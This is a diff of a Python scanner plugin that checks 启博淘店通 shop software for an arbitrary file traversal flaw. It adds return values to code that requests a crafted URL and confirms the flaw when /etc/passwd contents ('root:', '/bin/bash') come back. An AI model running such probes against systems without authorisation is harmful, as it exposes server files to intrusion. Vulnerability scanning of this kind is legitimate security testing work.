@@ -25,11 +25,14 @@ class shop360_do_filedownload_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
                 cprint("[+]存在启博淘店通标准版任意文件遍历漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "启博淘店通标准版任意文件遍历漏洞", str(payload), req.text
             else:
                 cprint("[-]不存在shop360_do_filedownload漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
